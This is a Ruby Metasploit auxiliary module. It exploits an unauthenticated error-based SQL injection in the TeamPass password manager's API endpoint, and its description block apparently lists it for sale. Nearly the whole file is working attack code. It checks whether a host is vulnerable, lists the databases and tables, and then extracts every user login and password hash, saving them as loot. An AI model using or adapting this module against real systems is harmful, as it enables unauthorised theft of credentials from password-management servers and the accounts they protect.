##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'TeamPass Password Manager Unauthenticated SQL Injection',
      'Description'    => %q{
    This module retrieves usernames and password hashes on vulnerable instances of TeamPass.

This module exploits an unauthenticated error-based SQL injection
in version 2.1.26.8 and likely prior in order to retrieve
the usernames and password hashes for the application users.

Categories: Enterprise, SQL Injection

Price: 5

Video: none

OS: Multi

Arch: Multi

Requirements: Metasploit Framework
},
      'References'     =>
        [
        ],
      'Author'         =>
        [
          'VolatileMinds'
        ],
      'License'        => 'VolatileMinds',
      'DisclosureDate' => ""
    ))

    register_options(
      [
        OptString.new("TARGETURI", [true, 'The relative URI of the TeamPass Password Manager installation', '/']),
        OptBool.new('FORCE', [true, 'If check fails, still attempt to exploit the vulnerability.', false])
      ], self.class)
  end

  def make_injected_request(sql)

    apikey = Rex::Text.rand_text_alpha(5)
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'api', 'index.php'),
      'vars_get' => {
        'apikey' => apikey,
        'pre' => 'teampass_users where 1=1 AND (' + sql + ') # '
      }
    })

   res
  end

  def check
    right = Rex::Text.rand_text_alpha(5)
    left = Rex::Text.rand_text_alpha(5)
    flag = Rex::Text.rand_text_alpha(5)

    sql = "SELECT 9624 FROM(SELECT COUNT(*),CONCAT(0x#{left.unpack('H*')[0]},0x#{flag.unpack('H*')[0]},0x#{right.unpack('H*')[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a"
    res = make_injected_request(sql)

    if res && res.body =~ /#{left}(.*?)#{right}/
      if $1 == flag
        return Msf::Exploit::CheckCode::Vulnerable
      end
    end

    return Msf::Exploit::CheckCode::Safe
  end

  def run
    if datastore['FORCE'] == false
      if check == Msf::Exploit::CheckCode::Safe
        print_error("Host doesn't appear vulnerable")
        return
      end
    end

    left = Rex::Text.rand_text_alpha(5)
    right = Rex::Text.rand_text_alpha(5)

    db_count = "SELECT 3616 FROM(SELECT COUNT(*),CONCAT(0x#{left.unpack("H*")[0]},(SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),0x#{right.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a"

    res = make_injected_request(db_count)

    db_count = $1 if res && res.body =~ /#{left}(.*?)#{right}/

    vprint_status('Found ' + db_count + ' dbs')

    dbs = []
    users = []
    0.upto(db_count.to_i-1) do |db|
      get_db = "SELECT 3970 FROM(SELECT COUNT(*),CONCAT(0x#{left.unpack("H*")[0]},(SELECT MID((IFNULL(CAST(schema_name AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT #{db},1),0x#{right.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a"
      res = make_injected_request(get_db)
      dbs << $1 if res && res.body =~ /#{left}(.*?)#{right}/
    end

    dbs.delete('sys')
    dbs.delete('information_schema')
    dbs.delete('performance_schema')
    dbs.delete('mysql')

    dbs.each do |db|
      vprint_status("Looking for users in database #{db}")
      table_count = "SELECT 4753 FROM(SELECT COUNT(*),CONCAT(0x#{left.unpack("H*")[0]},(SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x#{db.unpack("H*")[0]})),0x#{right.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a"
      res = make_injected_request(table_count)
      table_count = $1 if res && res.body =~ /#{left}(.*?)#{right}/

      vprint_status("Found #{table_count} tables.")

      tables = []
      0.upto(table_count.to_i-1) do |table|
        get_table = "SELECT 3534 FROM(SELECT COUNT(*),CONCAT(0x#{left.unpack("H*")[0]},(SELECT MID((IFNULL(CAST(table_name AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x#{db.unpack("H*")[0]}) LIMIT #{table},1),0x#{right.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a"
        res = make_injected_request(get_table)
        table_name = $1 if res && res.body =~ /#{left}(.*?)#{right}/
        tables << table_name if table_name =~ /_users$/
      end

      tables.each do |table|
        vprint_status("Found table #{table} with potential users. Retrieving usernames and password hashes.")

        user_count = "SELECT 7768 FROM(SELECT COUNT(*),CONCAT(0x#{left.unpack("H*")[0]},(SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM #{db}.#{table}),0x#{right.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a"
        res = make_injected_request(user_count)
        user_count = $1 if res && res.body =~ /#{left}(.*?)#{right}/
        0.upto(user_count.to_i-1) do |user|
          cols = ['login','pw','last_pw']
          u = {}
          cols.each do |col|
            len = 1
            value = ''

            loop do
              tmp = ''
              get_col = "SELECT 3970 FROM(SELECT COUNT(*),CONCAT(0x#{left.unpack("H*")[0]},(SELECT MID((IFNULL(CAST(#{col} AS CHAR),0x20)),#{len},54) FROM #{db}.#{table} LIMIT #{user},1),0x#{right.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a"
              res = make_injected_request(get_col)
              tmp = $1 if res && res.body =~ /#{left}(.*?)#{right}/
              if tmp.length == 0
                break
              end
              len += 54
              value << tmp
            end
            u[col] = value
          end
          users << u
          vprint_good("Found user: " + u['login'] + ':' + u['pw'])
        end

        path = store_loot("teampass.users", "application/json", datastore['RHOST'], users.to_json, "teampass_users.json", "TeamPass Password Manager Usernames and Password Hashes")
        print_good("Credentials stored in file: " + path)
      end
    end
  end
end

